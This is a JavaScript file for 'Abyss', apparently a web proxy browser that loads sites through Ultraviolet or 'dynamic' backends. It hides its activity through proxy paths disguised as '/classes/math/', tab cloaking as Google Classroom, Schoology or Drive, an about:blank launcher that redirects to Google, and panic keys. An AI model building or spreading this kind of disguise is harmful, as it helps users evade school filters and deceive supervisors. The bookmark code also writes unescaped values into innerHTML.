            tabElement.querySelectorAll(".extFrame").forEach((frame) => {
              frame.remove();
            });
          }
          const settingsTemplate = document
            .getElementById("settings-temp")
            .cloneNode(true);
          if (settingsTemplate instanceof HTMLDivElement) {
            settingsTemplate.id = "";
            settingsTemplate.style.display = "initial";
            settingsTemplate.querySelector("#themeSelect").value = tHs
              .getActiveTheme()
              .getName();
            settingsTemplate
              .querySelector("#themeSelect")
              .removeAttribute("id");
            tabElement.appendChild(settingsTemplate);
            if (window.panicKeys !== null) {
              settingsTemplate.querySelector(".panic").placeholder =
                "selected: " + window.panicKeys.join(" + ");
            }
            settingsTemplate.querySelector(".panicURL").value = window.panicURL;
            settingsTemplate.querySelector(".tabTitle").placeholder =
              localStorage.getItem("title") || "Abyss";
            settingsTemplate.querySelector(".tabIcon").placeholder =
              localStorage.getItem("favicon") || "Default Favicon";
            activeTab.getConnectedElement().querySelector("span").innerText =
              "Settings";
            document.getElementById("adrbar").placeholder = settingsPlaceholder;
            activeTab.getConnectedElement().querySelector("#tabFavicon").src = "assets/cog.png"
          }
          return;
        case "about":
          if (tabElement.querySelectorAll(".extFrame").length > 0) {
            tabElement.querySelectorAll(".extFrame").forEach((frame) => {
              frame.remove();
            });
          }
          const aboutTemplate = document
            .getElementById("about-temp")
            .cloneNode(true);
          if (aboutTemplate instanceof HTMLDivElement) {
            aboutTemplate.id = "";
            aboutTemplate.style.display = "initial";
            tabElement.appendChild(aboutTemplate);
            activeTab.getConnectedElement().querySelector("span").innerText =
              "About Abyss";
          }
          return;
        default:
          if (tabElement.querySelectorAll(".extFrame").length > 0) {
            tabElement.querySelectorAll(".extFrame").forEach((frame) => {
              frame.remove();
            });
          }
          const invalidMainTemplate = document
            .getElementById("invalid-temp")
            .cloneNode(true);
          if (invalidMainTemplate instanceof HTMLDivElement) {
            invalidMainTemplate.id = "";
            invalidMainTemplate.style.display = "initial";
            tabElement.appendChild(invalidMainTemplate);
            activeTab.getConnectedElement().querySelector("span").innerText =
              "Invalid";
          }
          return;
      }
    } else {
      if (tabElement.querySelectorAll(".extFrame").length > 0) {
        tabElement.querySelectorAll(".extFrame").forEach((frame) => {
          frame.remove();
        });
      }
      if (
        !override &&
        !/^(https?:\/\/)?[a-z0-9]+([\-\.]{1}[a-z0-9]+)*\.[a-z]{2,30}/i.test(url)
      ) {
        url = currentSearchURL + url;
      }
      if (!override && !/^(https?:\/\/)/.test(url)) {
        url = "https://" + url;
      }

      // activeTab.getConnectedElement().querySelector("span").innerText = "Website";

      const adrbarInputElement = document.getElementById("adrbar");
      if (adrbarInputElement instanceof HTMLInputElement) {
        adrbarInputElement.value = "";
        adrbarInputElement.placeholder = url;
        if (overrideadrbar) {
          adrbarInputElement.placeholder = overrideadrbar;
        }
      }
      const iframe = document.createElement("iframe");
      // iframe.src =
      //   "/service/route?url=" +
      //   encodeURIComponent(url);
      if (override) {
        iframe.src = url;
      } else {
        switch (chosenBackend) {
          case "uv":
            iframe.src = "/classes/math/" + __uv$config.encodeUrl(url);
            break;
          case "dynamic":
            iframe.src = "/classes/english/route?url=" + encodeURIComponent(url);
            break;
          default:
            iframe.src = __uv$config.prefix + __uv$config.encodeUrl(url);
            break;
        }
      }
      iframe.className = "extFrame";
      iframe.style.width = "100%";
      iframe.style.border = "none";
      iframe.style.background = "#111";
      tabElement.appendChild(iframe);
    }
  }
};
function decodeUrl(str) {
  if (!str) return str;
  let [input, ...search] = str.split('?');

  return (
      decodeURIComponent(input)
          .split('')
          .map((char, ind) =>
              ind % 2 ? String.fromCharCode(char.charCodeAt(0) ^ 2) : char
          )
          .join('') + (search.length ? '?' + search.join('?') : '')
  );
}

setInterval(() => {
  const activeTab = ts.getActiveTab();
  if (!activeTab) return;
  if (!activeTab.findFirstIFrame()) return;
  if (getTabTitle() == "http:") return;
  activeTab.getConnectedElement().querySelector("span").innerText =
    getTabTitle() || "Website";
  try {if (localStorage.getItem("backend") == 'uv' ||  localStorage.getItem("backend") == null ) {
    var extractedPart = activeTab.findFirstIFrame().contentDocument.location.href.substring(activeTab.findFirstIFrame().contentDocument.location.href.indexOf("/classes/math/") + "/classes/math/".length);
    document.querySelector("#adrbar").placeholder = decodeUrl(extractedPart);
    activeTab.getConnectedElement().querySelector("#tabFavicon").src = "https://t0.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=" + decodeUrl(extractedPart) + "&size=128";
  } else if (localStorage.getItem("backend") == 'dynamic') {
    var extractedPart = activeTab.findFirstIFrame().contentDocument.location.href.substring(activeTab.findFirstIFrame().contentDocument.location.href.indexOf("/classes/english/") + "/classes/english/".length);
    document.querySelector("#adrbar").placeholder = decodeUrl(extractedPart);
    activeTab.getConnectedElement().querySelector("#tabFavicon").src = "https://t0.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=" + decodeUrl(extractedPart) + "&size=128";
  }} catch (e) {}
  
  }, 100);


const ts = new TabSystem({
  tabContainer: document.querySelector("#tabContainer"),
  tabTemplate: document.querySelector("#tabTemplate"),
  btnTemplate: document.querySelector("#tabBtnTemplate"),
  tabBtnContainer: document.querySelector("#tabsBar"),
  URLBar: document.querySelector("#adrbar"),
  defaultPlaceholder: "type here to search...",
  closePlaceholder: "No tabs open, click the plus icon to open a new tab.",
});

const createNewTab = () => {
  ts.setActiveTab(ts.addTab(new Tab()));
  ts.activeTab.getTabElement().querySelector("#quote").innerText = splashtext[Math.floor(Math.random() * splashtext.length)];
  ts.activeTab.getTabElement().querySelector('#adrbar2').addEventListener("keydown", function (e) {
    if (e.key === "Enter") {
      e.preventDefault();
      if (ts.activeTab.getTabElement().querySelector('#adrbar2').value === "") return;
      runService(ts.activeTab.getTabElement().querySelector('#adrbar2').value);
      ts.activeTab.getTabElement().querySelector('#adrbar2').value;
    }
  });
};

createNewTab();

document.getElementById("adrbar").addEventListener("keydown", function (e) {
  if (e.key === "Enter") {
    e.preventDefault();
    if (document.getElementById("adrbar").value === "") return;
    runService(document.getElementById("adrbar").value);
    document.getElementById("adrbar").value;
  }
});



let tb = document.getElementById("tabsBar");
if (tb) {
  tb.addEventListener(
    "wheel",
    (evt) => {
      evt.preventDefault();
      let scrollAmount;
      if (evt.deltaY >= -15 && evt.deltaY <= 15) {
        scrollAmount = evt.deltaY * 20;
      } else {
        scrollAmount = evt.deltaY * 2.5;
      }
      tb.scrollTo({
        left: tb.scrollLeft + scrollAmount,
        behavior: "smooth",
      });
    },
    { passive: false }
  );
}

let bb = document.getElementById("bookmarksBar");
if (bb) {
  bb.addEventListener(
    "wheel",
    (evt) => {
      evt.preventDefault();
      let scrollAmount;
      if (evt.deltaY >= -15 && evt.deltaY <= 15) {
        scrollAmount = evt.deltaY * 20;
      } else {
        scrollAmount = evt.deltaY * 2.5;
      }
      bb.scrollTo({
        left: bb.scrollLeft + scrollAmount,
        behavior: "smooth",
      });
    },
    { passive: false }
  );
}

let ad = document.getElementById("adrbar");
if (ad) {
  ad.addEventListener(
    "wheel",
    (evt) => {
      evt.preventDefault();
      let scrollAmount;
      if (evt.deltaY >= -15 && evt.deltaY <= 15) {
        scrollAmount = evt.deltaY * 20;
      } else {
        scrollAmount = evt.deltaY * 2.5;
      }
      ad.scrollTo({
        left: ad.scrollLeft + scrollAmount,
        behavior: "smooth",
      });
    },
    { passive: false }
  );
}

const back = () => {
  const activeTab = ts.getActiveTab();
  if (activeTab) {
    const firstIFrame = activeTab.findFirstIFrame();
    if (firstIFrame) {
      firstIFrame.contentWindow.history.back();
    }
  }
};

const forward = () => {
  const activeTab = ts.getActiveTab();
  if (activeTab) {
    const firstIFrame = activeTab.findFirstIFrame();
    if (firstIFrame) {
      firstIFrame.contentWindow.history.forward();
    }
  }
};

const refresh = () => {
  const activeTab = ts.getActiveTab();
  if (activeTab) {
    const firstIFrame = activeTab.findFirstIFrame();
    if (firstIFrame) {
      firstIFrame.contentWindow.location.reload();
    }
  }
};

function opNT() {
  if (ts.getActiveTab() != null) {
    if (ts.getActiveTab().findFirstIFrame() != null) {
      var win = window.open("about:blank", "_blank");
      const frame = document.createElement("iframe");
      frame.src = ts.getActiveTab().findFirstIFrame().src;
      win.document.body.appendChild(frame);
      ts.deleteTab(ts.getActiveTab(), true);
      frame.style.cssText =
        "margin: 0; padding: 0; overflow: hidden; width: 100%; height: 100%; position: absolute; top: 0; left: 0; z-index: 1000000; border: none; border-radius: 0;";
    }
  }
}

function addDropElem(name) {
  var select = document.getElementById("themeSelect");
  var option = document.createElement("option");
  option.value = name;
  option.innerText = name;
  select.appendChild(option);
}

function getThemes() {
  fetch("assets/themes.json")
    .then((res) => res.json())
    .then((json) => {
      for (var theme = 0; theme < json.length; theme++) {
        var themeName = json[theme].name;
        var themeURL = json[theme].url;
        console.log(
          "%cDEV:%c Found %c" + themeName + " %c" + themeURL,
          "font-weight: bold",
          "font-weight: normal",
          "font-weight: bold",
          "font-weight: normal"
        );
        tHs.addTheme(new Theme(themeURL, themeName));
        addDropElem(themeName);
      }
      if (
        localStorage.getItem("theme") != null &&
        tHs.getThemeFromName(localStorage.getItem("theme"))
      ) {
        tHs.setActiveTheme(tHs.getThemeFromName(localStorage.getItem("theme")));
      }
    });
}

getThemes();

function getTabTitle() {
  if (!ts.getActiveTab()) return;
  if (!ts.getActiveTab().findFirstIFrame()) return;
  let url = ts.getActiveTab().findFirstIFrame().contentDocument.title;
  if (url) return url;
  return ts
    .getActiveTab()
    .findFirstIFrame()
    .src.toString()
    .replace(/(.+url=https%3A%2F%2F|.+continue=https:\/\/)/, "")
    .replace(/(%2F|\/).*/, "");
}
var bookmarks = JSON.parse(localStorage.getItem("bookmarks")) || [];

function removeBookmark(bookmark) {
  document.getElementById(bookmark).remove();
  for (var i = 0; i < bookmarks.length; i++) {
    if (bookmarks[i][0] == bookmark) {
      bookmarks.splice(i, 1);
    }
  }
  if (bookmarks.length <= 0) {
    document.getElementById("tabContainer").style.height = "calc(100vh - 110px)";
    document.getElementById("headerArea").style.height = "125px";
  }
  localStorage.setItem("bookmarks", JSON.stringify(bookmarks));
}

function addBookmark(bookmark) {
  var bookmarkEl = document.createElement("div");
  bookmarkEl.classList.add("bookmark");
  bookmarkEl.innerHTML = `
    <span onclick="runService('${bookmark[2]}', true, '${bookmark[1]}')">
      ${bookmark[1]}
    </span>
    <div class="bookmarkClose" onclick="removeBookmark(${bookmark[0]})">
      <span>+</span>
    </div>
  `;
  bookmarkEl.id = bookmark[0];
  document.getElementById("bookmarksBar").appendChild(bookmarkEl);
  if (bookmarks.length > 0) {
    document.getElementById("tabContainer").style.height = "calc(100% - 145.5px)";
    document.getElementById("headerArea").style.height = "160px";
  }
  localStorage.setItem("bookmarks", JSON.stringify(bookmarks));
}

function fullscreen() {
    const activeTab = ts.getActiveTab();
  if (activeTab) {
    const firstIFrame = activeTab.findFirstIFrame();
    if (firstIFrame) {
  firstIFrame.requestFullscreen();
}
}
}

function launchAB() {
  const popup = open('about:blank', '_blank')
  if (!popup || popup.closed) {
    alert('Please allow popups and redirects.')
  } else {
    const doc = popup.document
    const iframe = doc.createElement('iframe')
    const style = iframe.style
    const link = doc.createElement('link')

    const name = localStorage.getItem('title') || 'My Drive - Google Drive'
    const icon = localStorage.getItem('favicon') || 'https://ssl.gstatic.com/docs/doclist/images/drive_2022q3_32dp.png'

    doc.title = name
    link.rel = 'icon'
    link.href = icon

    iframe.src = location.href
    style.position = 'fixed'
    style.top = style.bottom = style.left = style.right = 0
    style.border = style.outline = 'none'
    style.width = style.height = '100%'

    doc.head.appendChild(link)
    doc.body.appendChild(iframe)

    const pLink = localStorage.getItem(encodeURI('pLink')) || 'https://www.google.com/'
    location.replace(pLink)

    const script = doc.createElement('script')
    script.textContent = `
      window.onbeforeunload = function (event) {
        const confirmationMessage = 'Leave Site?';
        (event || window.event).returnValue = confirmationMessage;
        return confirmationMessage;
      };
    `
    doc.head.appendChild(script)
  }
}


function tabSwitch(parse) {
    if (parse.value == 'Classroom') {
      cloakTitle('Home');
      cloakFavicon('https://ssl.gstatic.com/classroom/ic_product_classroom_144.png');
    } else if (parse.value == 'Schoology') {
      cloakTitle('Home | Schoology');
      cloakFavicon('https://asset-cdn.schoology.com/sites/all/themes/schoology_theme/favicon.ico');
    } else if (parse.value == 'Mathspace') {
      cloakTitle('Mathspace');
      cloakFavicon('https://mathspace-production-static.mathspace.co/static/cache/ea9ab2022ffbb8b29669acc8bd75e6a3b2187553/website/favicons/android-chrome-192x192.png');
    } else if (parse.value == 'Google') {
      cloakTitle('Google');
      cloakFavicon('https://www.google.com/favicon.ico');
    } else if (parse.value == 'Docs') {
      cloakTitle('Google Docs');
      cloakFavicon('https://ssl.gstatic.com/docs/documents/images/kix-favicon-2023q4.ico');
    } else if (parse.value == 'Drive') {
      cloakTitle('Home - Google Drive');
      cloakFavicon('https://ssl.gstatic.com/docs/doclist/images/drive_2022q3_32dp.png');
    } else if (parse.value == 'iXL') {
      cloakTitle('IXL');
      cloakFavicon('https://www.ixl.com/favicon.ico');
    } else if (parse.value == 'Khan') {
      cloakTitle('Khan Academy | Free Online Courses');
      cloakFavicon('https://www.khanacademy.org/favicon.ico');
    } 
}

function resetTab() {
  cloakTitle('Abyss')
  cloakFavicon('assets/favicon.ico')
}

function bookmark() {
  if (localStorage.getItem("backend") == 'uv' ||  localStorage.getItem("backend") == null ) {
    var url = "/classes/math/" + __uv$config.encodeUrl(document.getElementById('adrbar').placeholder);
  } else if (localStorage.getItem("backend") == 'dynamic') {
    var url =  "/classes/english/" + encodeURIComponent(document.getElementById('adrbar').placeholder);
  }
  if (ts.getActiveTab() != null) {
    if (ts.getActiveTab().findFirstIFrame() != null) {
      var bookmark = [
        ts.genRanId(),
        ts.getActiveTab().findFirstIFrame().contentDocument.title ||
        url,
        url
      ];
      bookmarks.push(bookmark);
      addBookmark(bookmark);
    }
  }
}

if (bookmarks.length > 0) {
  bookmarks.forEach((bookmark) => {
    addBookmark(bookmark);
  });
  document.getElementById("tabContainer").style.height = "calc(100% - 145.5px)";
  document.getElementById("headerArea").style.height = "160px";
}
try {
  inFrame = window !== top
} catch (e) {
  inFrame = true
}

if (!inFrame && localStorage.getItem("autolaunch") === 'on' && !navigator.userAgent.includes('Firefox')) {
  const popup = open('about:blank', '_blank')
  if (!popup || popup.closed) {
    alert('Please allow popups and redirects.')
  } else {
    const doc = popup.document
    const iframe = doc.createElement('iframe')
    const style = iframe.style
    const link = doc.createElement('link')

    const name = localStorage.getItem('title') || 'My Drive - Google Drive'
    const icon = localStorage.getItem('favicon') || 'https://ssl.gstatic.com/docs/doclist/images/drive_2022q3_32dp.png'

    doc.title = name
    link.rel = 'icon'
    link.href = icon

    iframe.src = location.href
    style.position = 'fixed'
    style.top = style.bottom = style.left = style.right = 0
    style.border = style.outline = 'none'
    style.width = style.height = '100%'

    doc.head.appendChild(link)
    doc.body.appendChild(iframe)

    const pLink = localStorage.getItem(encodeURI('pLink')) || 'https://www.google.com/'
    location.replace(pLink)

    const script = doc.createElement('script')
    script.textContent = `
      window.onbeforeunload = function (event) {
        const confirmationMessage = 'Leave Site?';
        (event || window.event).returnValue = confirmationMessage;
        return confirmationMessage;
      };
    `
    doc.head.appendChild(script)
  }
}

function initApps() {
  
  // Destroy all elements inside of #apps-temp .settingCards
  var settingCards = ts.activeTab.getTabElement().querySelector('#appsOrganizer');
  settingCards.innerHTML = '';
  // If the parameter is "choose...", then break the function
  
  // Fetch apps.json and filter based on the category
  fetch('assets/apps.json')
      .then(response => response.json())
      .then(data => {
          // Sort apps alphabetically by title
          data.sort((a, b) => a.name.localeCompare(b.name));
          
          // Iterate through sorted data and create app cards
          data.forEach(app => {
              // Create a new app card element
              var appCard = document.createElement('div');
              appCard.className = 'appCard'; // Add class based on category

              // Add onclick event to the app card
              appCard.onclick = function() {
                  runService(app.url);
              };

              // Create app image container
              var appImgContainer = document.createElement('div');
              appImgContainer.id = 'appImgContainer';
              appImgContainer.className = app.category;
              var appImg = document.createElement('img');
              appImg.src = app.image;
              appImgContainer.appendChild(appImg);

              // Create app title container
              var appTitleContainer = document.createElement('div');
              appTitleContainer.id = 'appTitleContainer';
              var appTitle = document.createElement('p');
              appTitle.id = 'appTitle';
              appTitle.textContent = app.name;
              appTitleContainer.appendChild(appTitle);

              // Append image and title containers to the app card
              appCard.appendChild(appImgContainer);
              appCard.appendChild(appTitleContainer);

              // Append the app card to the settingCards container
              settingCards.appendChild(appCard);
          });
      });
}

function filterCategory(category) {
  // Destroy all elements inside of #apps-temp .settingCards
  ts.activeTab.getTabElement().querySelector('#appsOrganizer').innerHTML = '';

  // If the parameter is "choose...", then break the function
  if (category === "choose...") return;

  fetch('assets/apps.json')
      .then(response => response.json())
      .then(data => {
          // Sort the data alphabetically by app name
          data.sort((a, b) => a.name.localeCompare(b.name));

          // Loop through each app in the sorted JSON data
          data.forEach(app => {
              // Check if the app's category matches the desired category
              if (app.category.includes(category) || category === 'all') {
                  // Create a new app card element
                  var appCard = document.createElement('div');
                  appCard.className = 'appCard'; // Add class based on category

                  // Add onclick event to the app card
                  appCard.onclick = function () {
                      runService(app.url);
                  };

                  // Create app image container
                  var appImgContainer = document.createElement('div');
                  appImgContainer.id = 'appImgContainer';
                  appImgContainer.className = app.category;
                  var appImg = document.createElement('img');
                  appImg.src = app.image;
                  appImgContainer.appendChild(appImg);

                  // Create app title container
                  var appTitleContainer = document.createElement('div');
                  appTitleContainer.id = 'appTitleContainer';
                  var appTitle = document.createElement('p');
                  appTitle.id = 'appTitle';
                  appTitle.textContent = app.name;
                  appTitleContainer.appendChild(appTitle);

                  // Append image and title containers to the app card
                  appCard.appendChild(appImgContainer);
                  appCard.appendChild(appTitleContainer);

                  // Append the app card to the settingCards container
                  ts.activeTab.getTabElement().querySelector('#appsOrganizer').appendChild(appCard);
              }
          });
      });
}
function filterAppByName(name) {
  if (!name) {
    ts.activeTab.getTabElement().querySelector('#appsOrganizer').innerHTML = ''; 
    initApps();
    return;}
  // Destroy all elements inside of #apps-temp .settingCards
  ts.activeTab.getTabElement().querySelector('#appsOrganizer').innerHTML = '';

  // If the parameter is empty or null, break the function
  if (name)
  fetch('assets/apps.json')
      .then(response => response.json())
      .then(data => {
          // Sort the data alphabetically by app name
          data.sort((a, b) => a.name.localeCompare(b.name));

          // Loop through each app in the sorted JSON data
          data.forEach(app => {
              // Check if the app's name contains the desired name
              if (app.name.toLowerCase().includes(name.toLowerCase())) {
                  // Create a new app card element
                  var appCard = document.createElement('div');
                  appCard.className = 'appCard'; // Add class based on category

                  // Add onclick event to the app card
                  appCard.onclick = function () {
                      runService(app.url);
                  };

                  // Create app image container
                  var appImgContainer = document.createElement('div');
                  appImgContainer.id = 'appImgContainer';
                  appImgContainer.className = app.category;
                  var appImg = document.createElement('img');
                  appImg.src = app.image;
                  appImgContainer.appendChild(appImg);

                  // Create app title container
                  var appTitleContainer = document.createElement('div');
                  appTitleContainer.id = 'appTitleContainer';
                  var appTitle = document.createElement('p');
                  appTitle.id = 'appTitle';
                  appTitle.textContent = app.name;
                  appTitleContainer.appendChild(appTitle);

                  // Append image and title containers to the app card
                  appCard.appendChild(appImgContainer);
                  appCard.appendChild(appTitleContainer);

                  // Append the app card to the settingCards container
                  ts.activeTab.getTabElement().querySelector('#appsOrganizer').appendChild(appCard);
              }
          });
      });
}

function initAppSearch() {
var categorySearchInput = ts.activeTab.getTabElement().querySelector('#categorySearch');
  categorySearchInput.addEventListener('input', function() {
      filterAppByName(categorySearchInput.value);
  });
}

function handleTargets() {
  // Get the active tab
  const activeTab = ts.getActiveTab();
  
  // Find the first iframe in the active tab
  const iframe = activeTab.findFirstIFrame();
  
  // Get the content document of the iframe
  const contentDocument = iframe.contentDocument;
  
  // Find all elements with target="_top" or target="_blank"
  const elements = contentDocument.querySelectorAll('[target="_top"], [target="_blank"]');
  
  // Loop through each element
  elements.forEach(element => {
      // Check if target="_top"
      if (element.getAttribute('target') === '_top') {
          // Remove the entire attribute
          element.removeAttribute('target');
      } else if (element.getAttribute('target') === '_blank') {
        const href = element.getAttribute('href');
        element.removeAttribute('target');
        element.setAttribute('onclick', `runService(${href}, true)`);
      }
  });
}
setInterval(() => {
  if (ts.getActiveTab().findFirstIFrame()) {
    handleTargets();
    }
    
}, 1000);
